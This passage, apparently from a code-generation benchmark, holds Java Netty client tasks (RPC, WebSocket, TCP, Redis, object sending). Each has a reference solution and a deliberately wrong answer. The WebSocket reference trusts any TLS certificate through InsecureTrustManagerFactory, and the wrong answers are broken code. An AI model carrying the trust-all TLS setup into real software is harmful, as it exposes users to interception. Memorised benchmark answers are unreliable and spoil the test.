channelProvider;\n    private final Bootstrap bootstrap;\n    private final EventLoopGroup eventLoopGroup;\n\n    public NettyRpcClient() {\n        eventLoopGroup = new NioEventLoopGroup();\n        bootstrap = new Bootstrap();\n        bootstrap.group(eventLoopGroup)\n                .channel(NioSocketChannel.class)\n                .handler(new LoggingHandler(LogLevel.INFO))\n                .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 5000)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ChannelPipeline p = ch.pipeline();\n                        p.addLast(new IdleStateHandler(0, 5, 0, TimeUnit.SECONDS));\n                        p.addLast(new RpcMessageEncoder());\n                        p.addLast(new RpcMessageDecoder());\n                        p.addLast(new NettyRpcClientHandler());\n                    }\n                });\n        this.serviceDiscovery = ExtensionLoader.getExtensionLoader(ServiceDiscovery.class).getExtension(ServiceDiscoveryEnum.ZK.getName());\n        this.unprocessedRequests = SingletonFactory.getInstance(UnprocessedRequests.class);\n        this.channelProvider = SingletonFactory.getInstance(ChannelProvider.class);\n    }\n\n    public Channel doConnect(InetSocketAddress inetSocketAddress) {\n        CompletableFuture<Channel> completableFuture = new CompletableFuture<>();\n        bootstrap.connect(inetSocketAddress).addListener((ChannelFutureListener) future -> {\n            if (future.isSuccess()) {\n                completableFuture.complete(future.channel());\n            } else {\n                throw new IllegalStateException();\n            }\n        });\n        return completableFuture.get();\n    }\n\n    @Override\n    public Object sendRpcRequest(RpcRequest rpcRequest) {\n        CompletableFuture<RpcResponse<Object>> resultFuture = new CompletableFuture<>();\n        InetSocketAddress inetSocketAddress = serviceDiscovery.lookupService(rpcRequest);\n        Channel channel = getChannel(inetSocketAddress);\n        if (channel.isActive()) {\n            unprocessedRequests.put(rpcRequest.getRequestId(), resultFuture);\n            RpcMessage rpcMessage = RpcMessage.builder().data(rpcRequest)\n                    .codec(SerializationTypeEnum.HESSIAN.getCode())\n                    .compress(CompressTypeEnum.GZIP.getCode())\n                    .messageType(RpcConstants.REQUEST_TYPE).build();\n            channel.writeAndFlush(rpcMessage).addListener((ChannelFutureListener) future -> {\n                if (future.isSuccess()) {\n                } else {\n                    future.channel().close();\n                    resultFuture.completeExceptionally(future.cause());\n                }\n            });\n        } else {\n            throw new IllegalStateException();\n        }\n        return resultFuture;\n    }\n\n    public Channel getChannel(InetSocketAddress inetSocketAddress) {\n        Channel channel = channelProvider.get(inetSocketAddress);\n        if (channel == null) {\n            channel = doConnect(inetSocketAddress);\n            channelProvider.set(inetSocketAddress, channel);\n        }\n        return channel;\n    }\n\n    public void close() {\n        eventLoopGroup.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public final class NettyRpcClient implements RpcRequestTransport {\n    private final ServiceDiscovery serviceDiscovery;\n    private final UnprocessedRequests unprocessedRequests;\n    private final ChannelProvider channelProvider;\n    private final Bootstrap bootstrap;\n    private final EventLoopGroup eventLoopGroup;\n\n    public NettyRpcClient() {\n        eventLoopGroup = new NioEventLoopGroup();\n        bootstrap = new Bootstrap();\n        bootstrap.group(eventLoopGroup);\n        bootstrap.channel(NioSocketChannel.class);\n        bootstrap.handler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            protected void initChannel(SocketChannel ch) {\n                ch.pipeline().addLast(new NettyRpcClientHandler(unprocessedRequests));\n            }\n        });\n        serviceDiscovery = new ServiceDiscovery();\n        unprocessedRequests = new UnprocessedRequests();\n        channelProvider = new ChannelProvider();\n    }\n\n    public Channel doConnect(InetSocketAddress inetSocketAddress) {\n        return bootstrap.connect(inetSocketAddress).syncUninterruptibly().channel();\n    }\n\n    public Object sendRpcRequest(RpcRequest rpcRequest) {\n        Channel channel = getChannel(rpcRequest.getAddress());\n        CompletableFuture<Object> future = new CompletableFuture<>();\n        unprocessedRequests.add(rpcRequest, future);\n        channel.writeAndFlush(rpcRequest);\n        return future;\n    }\n\n    public Channel getChannel(InetSocketAddress inetSocketAddress) {\n        Channel channel = channelProvider.getChannel(inetSocketAddress);\n        if (channel == null) {\n            channel = doConnect(inetSocketAddress);\n            channelProvider.putChannel(inetSocketAddress, channel);\n        }\n        return channel;\n    }\n\n    public void close() {\n        eventLoopGroup.shutdownGracefully();\n    }\n\n    private static class NettyRpcClientHandler extends ChannelInboundHandlerAdapter {\n        private final UnprocessedRequests unprocessedRequests;\n\n        public NettyRpcClientHandler(UnprocessedRequests unprocessedRequests) {\n            this.unprocessedRequests = unprocessedRequests;\n        }\n\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            if (msg instanceof RpcResponse) {\n                RpcResponse response = (RpcResponse) msg;\n                unprocessedRequests.complete(response);\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 124,
    "Instruction": "Task Description: Implement a Netty-based WebSocket client class that establishes and manages WebSocket connections, handles message sending/receiving, and provides connection status monitoring.\n\nClass Description: NettyWebSocket is a WebSocket client implementation using Netty framework that supports both WS and WSS protocols. It implements the ITransport interface for WebSocket communication, providing connection management, message transmission, and status checking capabilities.\n\nAttributes:\n- mChannel: Channel - The active Netty channel for WebSocket communication\n- mHandler: NettyWebSocketClientHandler - Custom handler for WebSocket events and messages\n- mGroup: NioEventLoopGroup - Netty event loop group for I/O operations\n- mUri: String - The WebSocket server URI to connect to\n- mOptions: WebSocketOptions - Configuration options for the WebSocket connection\n\nMethods:\n- connect(ITransportHandler transportHandler, TransportOptions options) -> void - Establishes a WebSocket connection to the specified URI. Initializes SSL context if needed, creates a handshaker, and sets up the Netty pipeline with necessary handlers.\n  Input: \n    - transportHandler: ITransportHandler - Callback handler for transport events\n    - options: TransportOptions - Connection-specific options\n  Output: None (throws Exception on failure)\n\n- send(byte[] payload, boolean isBinary) -> void - Sends data through the WebSocket connection as either binary or text frame.\n  Input:\n    - payload: byte[] - The data to send\n    - isBinary: boolean - Flag indicating binary (true) or text (false) format\n  Output: None\n\n- isOpen() -> boolean - Checks if the WebSocket connection is currently active.\n  Input: None\n  Output: boolean - True if connection is open, false otherwise\n\n- close() -> void - Closes the WebSocket connection gracefully and releases resources.\n  Input: None\n  Output: None (throws Exception on failure)\n\n- validateURIAndGetPort(URI uri) -> int - Validates the WebSocket URI and determines the appropriate port.\n  Input: uri: URI - The WebSocket URI to validate\n  Output: int - The port number to use\n\n- getSSLContext(String scheme) -> SslContext - Creates SSL context for WSS connections.\n  Input: scheme: String - The URI scheme (\"ws\" or \"wss\")\n  Output: SslContext - Configured SSL context or null for WS\n\n- toByteBuf(byte[] bytes) -> ByteBuf - Converts byte array to Netty ByteBuf.\n  Input: bytes: byte[] - Data to convert\n  Output: ByteBuf - Netty buffer containing the data",
    "Canonical_solution": "import java.net.URI;\nimport java.util.List;\nimport java.util.concurrent.TimeUnit;\n\nimport javax.net.ssl.SSLException;\n\nimport io.crossbar.autobahn.wamp.interfaces.ITransport;\nimport io.crossbar.autobahn.wamp.interfaces.ITransportHandler;\nimport io.crossbar.autobahn.wamp.types.CloseDetails;\nimport io.crossbar.autobahn.wamp.types.TransportOptions;\nimport io.crossbar.autobahn.wamp.types.WebSocketOptions;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelFutureListener;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.DefaultHttpHeaders;\nimport io.netty.handler.codec.http.HttpClientCodec;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.websocketx.BinaryWebSocketFrame;\nimport io.netty.handler.codec.http.websocketx.TextWebSocketFrame;\nimport io.netty.handler.codec.http.websocketx.WebSocketClientHandshaker;\nimport io.netty.handler.codec.http.websocketx.WebSocketClientHandshakerFactory;\nimport io.netty.handler.codec.http.websocketx.WebSocketFrame;\nimport io.netty.handler.codec.http.websocketx.WebSocketVersion;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\nimport io.netty.handler.timeout.IdleStateHandler;\n\npublic class NettyWebSocket implements ITransport {\n\n    private Channel mChannel;\n    private NettyWebSocketClientHandler mHandler;\n    private NioEventLoopGroup mGroup;\n    private final String mUri;\n    private WebSocketOptions mOptions;\n\n    public NettyWebSocket(String uri, WebSocketOptions options) {\n        mUri = uri;\n        mOptions = options != null ? options : new WebSocketOptions();\n    }\n\n    @Override\n    public void connect(ITransportHandler transportHandler, TransportOptions options) throws Exception {\n        if (options == null) {\n            options = new TransportOptions();\n            options.setAutoPingInterval(mOptions.getAutoPingInterval());\n            options.setAutoPingTimeout(mOptions.getAutoPingTimeout());\n            options.setMaxFramePayloadSize(mOptions.getMaxFramePayloadSize());\n        }\n\n        URI uri = new URI(mUri);\n        int port = validateURIAndGetPort(uri);\n        String scheme = uri.getScheme();\n        String host = uri.getHost();\n\n        final SslContext sslContext = getSSLContext(scheme);\n\n        WebSocketClientHandshaker handshaker = WebSocketClientHandshakerFactory.newHandshaker(\n                uri, WebSocketVersion.V13, null, true,\n                new DefaultHttpHeaders(), options.getMaxFramePayloadSize());\n        mHandler = new NettyWebSocketClientHandler(handshaker, this, transportHandler);\n\n        mGroup = new NioEventLoopGroup();\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(mGroup)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        if (sslContext != null) {\n                            pipeline.addLast(sslContext.newHandler(ch.alloc(), host, port));\n                        }\n                        pipeline.addLast(\n                                new HttpClientCodec(),\n                                new HttpObjectAggregator(8192),\n                                new IdleStateHandler(\n                                        options.getAutoPingInterval() + options.getAutoPingTimeout(),\n                                        options.getAutoPingInterval(), 0, TimeUnit.SECONDS),\n                                mHandler);\n                    }\n                });\n\n        ChannelFuture f = bootstrap.connect(uri.getHost(), port);\n        f.addListener((ChannelFutureListener) connectFuture -> {\n            if (connectFuture.cause() != null) {\n                transportHandler.onDisconnect(false);\n            } else {\n                mChannel = f.channel();\n            }\n        });\n    }\n\n    @Override\n    public void send(byte[] payload, boolean isBinary) {\n        WebSocketFrame frame = isBinary ?\n                new BinaryWebSocketFrame(toByteBuf(payload)) :\n                new TextWebSocketFrame(toByteBuf(payload));\n        mChannel.writeAndFlush(frame);\n    }\n\n    @Override\n    public boolean isOpen() {\n        return mChannel != null && mChannel.isOpen();\n    }\n\n    @Override\n    public void close() throws Exception {\n        if (mHandler != null && mChannel != null) {\n            mHandler.close(mChannel, true, new CloseDetails(CloseDetails.REASON_DEFAULT, null));\n        }\n        if (mGroup != null) {\n            mGroup.shutdownGracefully().sync();\n            mGroup = null;\n        }\n    }\n\n    private int validateURIAndGetPort(URI uri) {\n        String scheme = uri.getScheme();\n        if (!\"ws\".equalsIgnoreCase(scheme) && !\"wss\".equalsIgnoreCase(scheme)) {\n            throw new IllegalArgumentException(\"Only WS(S) is supported.\");\n        }\n        int port = uri.getPort();\n        if (port == -1) {\n            port = \"ws\".equalsIgnoreCase(scheme) ? 80 : 443;\n        }\n        return port;\n    }\n\n    private SslContext getSSLContext(String scheme) throws SSLException {\n        return \"wss\".equalsIgnoreCase(scheme) ?\n                SslContextBuilder.forClient().trustManager(InsecureTrustManagerFactory.INSTANCE).build() :\n                null;\n    }\n\n    private ByteBuf toByteBuf(byte[] bytes) {\n        return Unpooled.copiedBuffer(bytes);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class NettyWebSocket {\n    private Channel mChannel;\n    private NettyWebSocketClientHandler mHandler;\n    private NioEventLoopGroup mGroup;\n    private String mUri;\n    private WebSocketOptions mOptions;\n\n    public void connect(ITransportHandler transportHandler, TransportOptions options) throws Exception {\n        if (mGroup == null) {\n            mGroup = new NioEventLoopGroup();\n        }\n        URI uri = new URI(mUri);\n        String scheme = uri.getScheme();\n        String host = uri.getHost();\n        int port = validateURIAndGetPort(uri);\n        SslContext sslCtx = getSSLContext(scheme);\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(mGroup)\n                 .channel(NioSocketChannel.class)\n                 .handler(new ChannelInitializer<Channel>() {\n                     @Override\n                     protected void initChannel(Channel ch) throws Exception {\n                         ChannelPipeline pipeline = ch.pipeline();\n                         if (sslCtx != null) {\n                             pipeline.addLast(sslCtx.newHandler(ch));\n                         }\n                         pipeline.addLast(transportHandler);\n                     }\n                 });\n        ChannelFuture future = bootstrap.connect(host, port).sync();\n        future.addListener(future1 -> {\n            if (future1.isSuccess()) {\n                mChannel = future1.channel();\n                mHandler.setChannel(mChannel);\n                WebSocketClientHandshaker handshaker = WebSocketClientHandshakerFactory.newHandshaker(new URI(mUri), mHandler, options);\n                handshaker.handshake(mChannel);\n            } else {\n                throw new Exception(\"Connection failed\");\n            }\n        });\n    }\n\n    public void send(byte[] payload, boolean isBinary) {\n        ByteBuf buf = toByteBuf(payload);\n        if (isBinary) {\n            mHandler.writeBinaryFrame(buf);\n        } else {\n            mHandler.writeTextFrame(buf);\n        }\n    }\n\n    public boolean isOpen() {\n        return mChannel != null && mChannel.isActive() && mHandler.isHandshakeComplete();\n    }\n\n    public void close() throws Exception {\n        if (mChannel != null) {\n            mChannel.close().sync();\n        }\n        if (mGroup != null) {\n            mGroup.shutdownGracefully();\n        }\n    }\n\n    private int validateURIAndGetPort(URI uri) {\n        int port = uri.getPort();\n        if (port <= 0) {\n            String scheme = uri.getScheme();\n            if (\"ws\".equals(scheme)) {\n                port = 80;\n            } else if (\"wss\".equals(scheme)) {\n                port = 443;\n            } else {\n                throw new IllegalArgumentException(\"Invalid scheme: \" + scheme);\n            }\n        }\n        return port;\n    }\n\n    private SslContext getSSLContext(String scheme) {\n        if (\"wss\".equals(scheme)) {\n            try {\n                return SslContext.newClientContext();\n            } catch (Exception e) {\n                throw new RuntimeException(\"Failed to create SSL context\", e);\n            }\n        }\n        return null;\n    }\n\n    private ByteBuf toByteBuf(byte[] bytes) {\n        return Unpooled.wrappedBuffer(bytes);\n    }\n}"
  },
  {
    "Task_id": 127,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework for establishing non-blocking network connections to a remote server.\n\nClass Description: The NettyTcpClient class provides functionality to create and manage TCP client connections using Netty's asynchronous event-driven network framework. It handles connection establishment, pipeline configuration, and resource cleanup.\n\nAttributes:\n- eventLoopGroup: [NioEventLoopGroup] - Manages the event processing threads for the client\n- bootstrap: [Bootstrap] - The main configuration object for the Netty client\n\nMethods:\n- NettyTcpClient(): [Constructor] -> [void] - Initializes the client with a new NioEventLoopGroup and Bootstrap instance\n- configureBootstrap(): [void]() -> [void] - Configures the bootstrap with channel type and event loop group\n- connect(int port, String host, Consumer<Connection> handler): [ChannelFuture](int, String, Consumer<Connection>) -> [ChannelFuture] - Establishes a connection to the specified host and port, allowing for pipeline configuration via the handler\n- shutdown(): [void]() -> [void] - Shuts down the event loop group gracefully to release resources\n\nNested Class:\n- Connection: [static class] - Represents an established connection with channel and HTTP/2 components\n  Attributes:\n    - channel: [Channel] - The network channel\n    - context: [ChannelHandlerContext] - The handler context\n    - connection: [Http2Connection] - HTTP/2 connection object\n    - encoder: [Http2ConnectionEncoder] - HTTP/2 encoder\n    - decoder: [Http2ConnectionDecoder] - HTTP/2 decoder\n  Methods:\n    - Connection(ChannelHandlerContext, Http2Connection, Http2ConnectionEncoder, Http2ConnectionDecoder): [Constructor] -> [void] - Creates a new connection instance\n    - nextStreamId(): [int]() -> [int] - Gets the next available stream ID for HTTP/2 communication",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.net.InetSocketAddress;\nimport java.util.function.Consumer;\n\npublic class NettyTcpClient {\n\n    private final NioEventLoopGroup eventLoopGroup;\n    private final Bootstrap bootstrap;\n\n    public NettyTcpClient() {\n        this.eventLoopGroup = new NioEventLoopGroup();\n        this.bootstrap = new Bootstrap();\n        configureBootstrap();\n    }\n\n    private void configureBootstrap() {\n        bootstrap.channel(NioSocketChannel.class)\n                .group(eventLoopGroup);\n    }\n\n    public ChannelFuture connect(int port, String host, Consumer<Connection> handler) {\n        bootstrap.handler(new ChannelInitializer<Channel>() {\n            @Override\n            protected void initChannel(Channel ch) throws Exception {\n                // Configure client pipeline here\n                // Add encoders, decoders and custom handlers\n            }\n        });\n        return bootstrap.connect(new InetSocketAddress(host, port));\n    }\n\n    public void shutdown() {\n        eventLoopGroup.shutdownGracefully();\n    }\n\n    public static class Connection {\n        public final Channel channel;\n        public final ChannelHandlerContext context;\n        public final Http2Connection connection;\n        public final Http2ConnectionEncoder encoder;\n        public final Http2ConnectionDecoder decoder;\n\n        public Connection(ChannelHandlerContext context, Http2Connection connection, \n                         Http2ConnectionEncoder encoder, Http2ConnectionDecoder decoder) {\n            this.channel = context.channel();\n            this.context = context;\n            this.connection = connection;\n            this.encoder = encoder;\n            this.decoder = decoder;\n        }\n\n        public int nextStreamId() {\n            return connection.local().incrementAndGetNextStreamId();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class NettyTcpClient {\n    private final EventLoopGroup eventLoopGroup;\n    private final Bootstrap bootstrap;\n\n    public NettyTcpClient() {\n        this.eventLoopGroup = new NioEventLoopGroup();\n        this.bootstrap = new Bootstrap();\n    }\n\n    protected void configureBootstrap() {\n        bootstrap.group(eventLoopGroup);\n        bootstrap.channel(NioSocketChannel.class);\n    }\n\n    public ChannelFuture connect(int port, String host, Consumer<Connection> handler) {\n        configureBootstrap();\n        ChannelFuture future = bootstrap.connect(host, port);\n        future.addListener(future1 -> {\n            if (future1.isSuccess()) {\n                Channel channel = future1.channel();\n                ChannelHandlerContext ctx = channel.pipeline().firstContext();\n                Http2Connection connection = new Http2Connection();\n                Http2ConnectionEncoder encoder = new Http2ConnectionEncoder();\n                Http2ConnectionDecoder decoder = new Http2ConnectionDecoder();\n                Connection connectionObj = new Connection(ctx, connection, encoder, decoder);\n                handler.accept(connectionObj);\n            } else {\n                future1 cause = future1.cause();\n                cause.printStackTrace();\n            }\n        });\n        return future;\n    }\n\n    public void shutdown() {\n        eventLoopGroup.shutdownGracefully();\n    }\n\n    public static class Connection {\n        private final ChannelHandlerContext context;\n        private final Http2Connection connection;\n        private final Http2ConnectionEncoder encoder;\n        private final Http2ConnectionDecoder decoder;\n\n        public Connection(ChannelHandlerContext context, Http2Connection connection, Http2ConnectionEncoder encoder, Http2ConnectionDecoder decoder) {\n            this.context = context;\n            this.connection = connection;\n            this.encoder = encoder;\n            this.decoder = decoder;\n        }\n\n        public int nextStreamId() {\n            return connection.nextStreamId();\n        }\n    }\n}"
  },
  {
    "Task_id": 128,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish non-blocking connections to a remote server, handle message processing through a configurable pipeline, and ensure proper resource cleanup.\n\nClass Description: The MocoClient class provides a reusable TCP client implementation using Netty's non-blocking I/O capabilities. It manages connection lifecycle, channel configuration, and graceful shutdown of network resources.\n\nAttributes:\n- None (This is a stateless client implementation where all configuration is passed through method parameters)\n\nMethods:\n- run(String host, int port, ChannelHandler pipelineFactory) -> void - Main method that initializes and runs the Netty client. It takes the server host address, port number, and a pipeline factory for configuring message handlers. The method establishes the connection, waits for it to close, and ensures proper resource cleanup. Throws MocoException if interrupted during operation.\n\nThe method performs these key operations:\n1. Creates NioEventLoopGroup for I/O thread management\n2. Configures Bootstrap with NioSocketChannel and connection parameters\n3. Sets TCP_NODELAY option for low-latency communication\n4. Applies the provided pipeline factory for message handling\n5. Establishes connection and waits for channel closure\n6. Implements graceful shutdown in finally block",
    "Canonical_solution": "import com.github.dreamhead.moco.MocoException;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelFutureListener;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\n\npublic class MocoClient {\n    public final void run(final String host, final int port, final ChannelHandler pipelineFactory) {\n        EventLoopGroup group = new NioEventLoopGroup();\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(group)\n                .channel(NioSocketChannel.class)\n                .remoteAddress(host, port)\n                .option(ChannelOption.TCP_NODELAY, true)\n                .handler(pipelineFactory);\n\n        try {\n            Channel channel = bootstrap.connect().sync().channel();\n            ChannelFuture future = channel.closeFuture().sync();\n            future.addListener(ChannelFutureListener.CLOSE);\n        } catch (InterruptedException e) {\n            throw new MocoException(e);\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class MocoClient {\n    static class MocoException extends Exception {\n        public MocoException(String message) {\n            super(message);\n        }\n        public MocoException(String message, Throwable cause) {\n            super(message, cause);\n        }\n    }\n\n    public void run(String host, int port, ChannelHandler pipelineFactory) throws MocoException {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                     .channel(NioSocketChannel.class)\n                     .option(ChannelOption.TCP_NODELAY, true)\n                     .handler(pipelineFactory);\n            ChannelFuture future = bootstrap.connect(host, port).sync();\n            try {\n                future.channel().closeFuture().await();\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n                throw new MocoException(\"Interrupted during operation\", e);\n            }\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}"
  },
  {
    "Task_id": 130,
    "Instruction": "Task Description: Create a Java class that implements a Redis client using Netty framework for TCP communication, capable of sending Redis commands and receiving responses.\n\nClass Description: The RedisClient class establishes a non-blocking TCP connection to a Redis server using Netty's NIO framework. It handles command input from the user, sends commands to the Redis server, and manages connection lifecycle including graceful shutdown.\n\nAttributes:\n- HOST: [String] - The Redis server host address (default: \"127.0.0.1\")\n- PORT: [int] - The Redis server port number (default: 6379)\n- group: [EventLoopGroup] - Manages client-side I/O threads\n- channel: [Channel] - The active network channel for communication\n- lastWriteFuture: [ChannelFuture] - Tracks the last write operation to the server\n\nMethods:\n- start(): [void] - Initializes the Netty client, establishes connection to Redis server, and starts command input loop\n- stop(): [void] - Closes the connection and shuts down the client gracefully\n- initChannel(SocketChannel ch): [void] - Configures the channel pipeline with Redis codecs and handlers (internal method)",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.redis.RedisArrayAggregator;\nimport io.netty.handler.codec.redis.RedisBulkStringAggregator;\nimport io.netty.handler.codec.redis.RedisDecoder;\nimport io.netty.handler.codec.redis.RedisEncoder;\nimport io.netty.util.concurrent.GenericFutureListener;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class RedisClient {\n    private static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    private static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"6379\"));\n\n    private EventLoopGroup group;\n    private Channel channel;\n    private ChannelFuture lastWriteFuture;\n\n    public void start() throws Exception {\n        group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(new RedisDecoder());\n                     p.addLast(new RedisBulkStringAggregator());\n                     p.addLast(new RedisArrayAggregator());\n                     p.addLast(new RedisEncoder());\n                     p.addLast(new RedisClientHandler());\n                 }\n             });\n\n            channel = b.connect(HOST, PORT).sync().channel();\n\n            System.out.println(\"Enter Redis commands (quit to end)\");\n            BufferedReader in = new BufferedReader(new InputStreamReader(System.in));\n            for (;;) {\n                final String input = in.readLine();\n                final String line = input != null ? input.trim() : null;\n                if (line == null || \"quit\".equalsIgnoreCase(line)) {\n                    channel.close().sync();\n                    break;\n                } else if (line.isEmpty()) {\n                    continue;\n                }\n                lastWriteFuture = channel.writeAndFlush(line);\n                lastWriteFuture.addListener(new GenericFutureListener<ChannelFuture>() {\n                    @Override\n                    public void operationComplete(ChannelFuture future) throws Exception {\n                        if (!future.isSuccess()) {\n                            System.err.print(\"write failed: \");\n                            future.cause().printStackTrace(System.err);\n                        }\n                    }\n                });\n            }\n\n            if (lastWriteFuture != null) {\n                lastWriteFuture.sync();\n            }\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    public void stop() throws InterruptedException {\n        if (channel != null) {\n            channel.close().sync();\n        }\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class RedisClient {\n    private String host = \"127.0.0.1\";\n    private int port = 6379;\n    private EventLoopGroup group;\n    private Channel channel;\n    private ChannelFuture lastWriteFuture;\n\n    public void start() {\n        group = new NioEventLoopGroup();\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(group)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        initChannel(ch);\n                    }\n                });\n        ChannelFuture future = bootstrap.connect(host, port).sync();\n        channel = future.channel();\n        lastWriteFuture = future;\n\n        new Thread(() -> {\n            Scanner scanner = new Scanner(System.in);\n            while (true) {\n                System.out.print(\"Redis> \");\n                String command = scanner.nextLine();\n                if (command.equalsIgnoreCase(\"exit\")) break;\n                channel.writeAndFlush(command + \"\\r\\n\");\n            }\n        }).start();\n\n        future.channel().closeFuture().sync();\n    }\n\n    public void stop() {\n        if (channel != null) {\n            channel.close();\n        }\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n\n    private void initChannel(SocketChannel ch) {\n        ch.pipeline().addLast(new LengthFieldBasedFrameDecoder(\n                RedisStringCommandEncoder.DEFAULT_MAX_FRAME_SIZE,\n                0, 2, 0, 2, true));\n        ch.pipeline().addLast(new RedisStringCommandDecoder());\n        ch.pipeline().addLast(new RedisStringCommandEncoder());\n        ch.pipeline().addLast(new RedisClientHandler(this));\n    }\n\n    public String getHost() {\n        return host;\n    }\n\n    public int getPort() {\n        return port;\n    }\n\n    private static class RedisClientHandler extends SimpleChannelInboundHandler<String> {\n        private final RedisClient client;\n\n        public RedisClientHandler(RedisClient client) {\n            this.client = client;\n        }\n\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, String msg) throws Exception {\n            System.out.println(\"Received: \" + msg);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 131,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to send serialized Java objects to a remote server.\n\nClass Description: The JacksonClient class establishes a TCP connection to a specified host and port using Netty's non-blocking I/O. It sends a JacksonBean object containing sample data (including lists and maps) to the server and handles connection lifecycle properly.\n\nAttributes:\nhost: String - The hostname or IP address of the remote server\nport: int - The port number of the remote server\n\nMethods:\nconstructor: JacksonClient(String host, int port) -> void - Initializes the client with target server address\nrun: run() -> void - Establishes connection, sends sample data, and manages connection lifecycle. Throws Exception if connection fails",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.util.ArrayList;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\npublic class JacksonClient {\n\n    private final String host;\n    private final int port;\n\n    public JacksonClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap()\n                    .group(group)\n                    .channel(NioSocketChannel.class)\n                    .handler(new JacksonClientInitializer());\n            \n            Channel channel = bootstrap.connect(host, port).sync().channel();\n\n            JacksonBean user = new JacksonBean();\n            user.setAge(27);\n            user.setName(\"waylau\");\n            List<String> sons = new ArrayList<String>();\n            for (int i = 0; i < 10; i++) {\n                sons.add(\"Lucy\"+i);\n                sons.add(\"Lily\"+i);\n            }\n\n            user.setSons(sons);\n            Map<String, String> addrs = new HashMap<String, String>();\n            for (int i = 0; i < 10; i++) {\n                addrs.put(\"001\"+i, \"18998366112\");\n                addrs.put(\"002\"+i, \"15014965012\");\n            }\n\n            user.setAddrs(addrs);\n            channel.write(user);\n            channel.flush();\n\n            channel.closeFuture().sync();\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
